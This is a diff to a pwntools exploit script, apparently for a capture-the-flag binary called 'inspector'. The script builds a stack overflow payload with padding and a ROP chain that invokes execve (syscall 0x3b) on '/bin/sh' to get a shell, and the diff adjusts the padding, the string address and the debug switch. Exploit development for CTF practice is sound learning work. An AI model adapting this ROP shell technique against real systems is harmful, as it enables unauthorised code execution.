@@ -12,7 +12,7 @@ do_remote = False
 binary_name = './inspector'
 
 #for doing local debugging
-is_local_dbg = True
+is_local_dbg = False
 gdb_script = '''
 set pagination off
 set disassembly-flavor intel
@@ -34,6 +34,8 @@ DATA = ''
 DATA += ('AAAAAAAA')
 DATA += ('AAAAAAAA')
 DATA += ('AAAAAAAA')
+DATA += ('AAAAAAAA')
+DATA += ('AAAAAAAA')
 
 DATA += p64(0x00400646) #first called after padding.
 DATA += p64(0x3b)
@@ -42,7 +44,7 @@ DATA += p64(0x00)
 DATA += p64(0x00400636)
 DATA += p64(0x00)
 DATA += p64(0x0040062e)
-DATA += ('/bin/sh ')
+DATA += p64(0x00400708)
 DATA += p64(0x00400625)
 
 
@@ -53,8 +55,10 @@ DATA += p64(0x00400625)
 
 
 
-
-target = gdb.debug(binary_name, gdb_script)
+if is_local_dbg:
+    target = gdb.debug(binary_name, gdb_script)
+else:
+    target = process(binary_name)
 print target.read()
 print DATA
 target.sendline(DATA)
